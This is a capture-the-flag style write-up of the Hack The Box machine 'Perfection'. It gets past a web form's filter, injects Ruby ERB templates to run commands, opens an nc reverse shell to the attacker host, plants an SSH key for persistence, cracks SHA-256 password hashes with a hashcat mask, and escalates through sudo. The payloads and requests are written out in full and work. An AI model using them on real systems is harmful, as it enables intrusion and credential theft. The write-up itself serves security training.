---
cover: >-
  https://labs.hackthebox.com/storage/avatars/57fc0f58916cb3ed8e793db071769d70.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Perfection

## 1. Machine General Information

* **Operative System:** Linux
* **Difficulty**: Easy
* **Keywords**:
  * Hashcat
  * Password Cracking
  * SSTI

## 2. Enumeration

### 2.1 Port Scanning

```
$ cat nmap/default-script-scan.nmap 
# Nmap 7.94SVN scan initiated Thu Mar 28 18:49:11 2024 as: nmap -sC -Pn -T5 -oN nmap/default-script-scan.nmap 10.10.11.253
Nmap scan report for 10.10.11.253
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http
|_http-title: Weighted Grade Calculator

# Nmap done at Thu Mar 28 18:49:18 2024 -- 1 IP address (1 host up) scanned in 6.21 seconds
```

Service running on port 80 is a Ruby WEBrick server:

```
$ curl http://perfection.htb -I
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 29 Mar 2024 03:32:59 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3842
Connection: keep-alive
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
```

### 2.2 Web Server Enumeration

Inspecting the web site the only interesting thing that we could see is a form at  the next path:

* `http://perfection.htb/weighted-grade`&#x20;

<figure><img src="../../../../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>

If we try to send a XSS payload in the first category field like in the next image:

<figure><img src="../../../../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>

This is a filter.

## 3. Exploitation

### 3.1 Bypassing Filter

With a little fuzzing of the first category parameter, we can get some payloads capable of bypass the  filter. We can use `wfuzz` .

```
$ wfuzz -v -c -t 30 -u http://10.10.11.253/weighted-grade-calc -w /usr/share/wordlists/SecLists/Fuzzing/command-injection-commix.txt -X POST -d 'category1=FUZZ&grade1=10&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' --hs "Malicious input blocked"      
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.253/weighted-grade-calc
Total requests: 8262

====================================================================================================================================================
ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload                                                                                                                      
====================================================================================================================================================

000003307:   0.198s       200        146 L      461 W    5356 Ch     WEBrick/1.7.0 (Ruby/3.0.2/2021                                    "'print(`echo%20AHOHOK%0aecho%20$((14%2B28))%0aecho%20AHOHOK%0aecho%20AHOHOK`)%3BAHOHOK"  
```

Now we can use the payload ``'print(`echo%20AHOHOK%0aecho%20$((14%2B28))%0aecho%20AHOHOK%0aecho%20AHOHOK`)%3BAHOHOK`` with burpsuite to bypass the filter:

<figure><img src="../../../../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>

We can inject code to the page and as i mentioned before, the server is running Ruby WEBrick so we can try a Server Side Templade Injection (SSTI).

To do this, we only have to add to the payload the next command:&#x20;

```
<%= system("SYSTEM COMMAND HERE") %>
```

I'm gonna try a simple `nc` reverse connection to test if the command is being executed.

The final result should look like this:

{% code title="Plain Text" %}
```ruby
 <%= system("nc 10.10.14.3 6969") %>
```
{% endcode %}

{% code title="URL Encoded" %}
```url
%20%3c%25%3d%20%73%79%73%74%65%6d%28%22%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%20%36%39%36%39%22%29%20%25%3e
```
{% endcode %}

Now im going to start a listener with `nc` and send the request with burpsuite.

```
# Starting a listener
$ nc -lvnp 6969
listening on [any] 6969 ...

# Sending request with burpsuite
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 272
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade-calc
Upgrade-Insecure-Requests: 1

category1='print(`echo%20AHOHOK%0aecho%20$((14%2B28))%0aecho%20AHOHOK%0aecho%20AHOHOK`)%3BAHOHOK%20%3c%25%3d%20%73%79%73%74%65%6d%28%22%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%20%36%39%36%39%22%29%20%25%3e&grade1=10&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0

# Receiving connection
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.253] 44030
```

### 3.2 Obtaining Access

We have Remote Code Execution so the next step is to get a reverse shell:

{% code title="Plain Text" %}
```ruby
 <%= system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.3 6969 >/tmp/f") %>
```
{% endcode %}

{% code title="URL Encoded" %}
```url
%20%3c%25%3d%20%73%79%73%74%65%6d%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%20%36%39%36%39%20%3e%2f%74%6d%70%2f%66%22%29%20%25%3e
```
{% endcode %}

Repeating the same steps, starting a listener and sending the payload:

```
# starting listener with nc
─$ nc -lvnp 6969
listening on [any] 6969 ...

# Sending post request with burpsuite
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 272
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade-calc
Upgrade-Insecure-Requests: 1

category1='print(`echo%20AHOHOK%0aecho%20$((14%2B28))%0aecho%20AHOHOK%0aecho%20AHOHOK`)%3BAHOHOK%20%3c%25%3d%20%73%79%73%74%65%6d%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%20%36%39%36%39%20%3e%2f%74%6d%70%2f%66%22%29%20%25%3e&grade1=10&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0

# Receiving reverse shell
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.253] 35270
sh: 0: can't access tty; job control turned off
$ whoami
susan
$ cat ~/user.txt
SECRETSECRETSECRETSECRET
```

### 3.3 Obtaining A SSH Session

To get an interactive Shell with SSH, we need to add our ssh public key to the authorized\_keys file inside .ssh directory in susan's home folder:

```
# OUR MACHINE
$ cat ~/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC85oqEOhsywZwiTnVdefSp025Zf4krlhcIM4q0U5p9C kali@kali

# SUSAN'S MACHINE
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC85oqEOhsywZwiTnVdefSp025Zf4krlhcIM4q0U5p9C kali@kali" > ~/.ssh/authorized_keys

# OUR MACHINE
$ ssh susan@perfection.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Fri Mar 29 04:34:34 AM UTC 2024

  System load:           0.0
  Usage of /:            68.7% of 5.80GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             250
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.253
  IPv6 address for eth0: dead:beef::250:56ff:feb9:8617


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Fri Mar 29 01:35:13 2024 from 10.10.14.3
susan@perfection:~$
```

## 4. Privilege Escalation

### 4.1 Basic Enumeration

If we pay attention to the login banner, we can see that we have mail so let's read it:

```
susan@perfection:~$ cat /var/mail/susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student

```

With this info we could do a brute force attack to get susan's password, but we don't have any hash yet and a bruteforce attack to SSH would take a long time so let's keep enumerating...

Inside susan's home folder, there is a directory called `Migration` and inside this folder there is a sqlite3 database. Reading this database we get various hashes.

```
susan@perfection:~/Migration$ ls
pupilpath_credentials.db
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

We have hashes and a possible format of the password.

### 4.2 Carcking Hashes With Hashcat

Hashcat allow us to use built-in charsets so we dont have to generate a wordlist. The next command should do the work:

```
$ hashcat -m 1400 hash.txt -a 3 "susan_nasus_?d?d?d?d?d?d?d?d?d"
...
ime.Started.....: Thu Mar 28 23:21:49 2024 (3 mins, 0 secs)
Time.Estimated...: Thu Mar 28 23:24:49 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1831.5 kH/s (0.53ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324558848/1000000000 (32.46%)
Rejected.........: 0/324558848 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_803824210
Hardware.Mon.#1..: Util: 60%

Started: Thu Mar 28 23:21:48 2024
Stopped: Thu Mar 28 23:24:51 2024

...

$ hashcat -m 1400 hash.txt -a 3 "susan_nasus_?d?d?d?d?d?d?d?d?d" --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

The password for susan user is `susan_nasus_413759210`.&#x20;

We're going to list privileges for user susan:

```
susan@perfection:~/Migration$ sudo -l
[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

Susan has privileges to execute ALL as root so the last thing to do is to read root.txt flag:

```
susan@perfection:~/Migration$ sudo cat /root/root.txt
SECRETSECRETSECRETSECRET
```

## 5. References

* Hashcat mask\_attack [https://hashcat.net/wiki/doku.php?id=mask\_attack](https://hashcat.net/wiki/doku.php?id=mask\_attack)
* Ruby SSTI [https://book.hacktricks.xyz/v/es/pentesting-web/ssti-server-side-template-injection#erb-ruby](https://book.hacktricks.xyz/v/es/pentesting-web/ssti-server-side-template-injection#erb-ruby)
* Reverse Shell Generator [https://www.revshells.com/](https://www.revshells.com/)
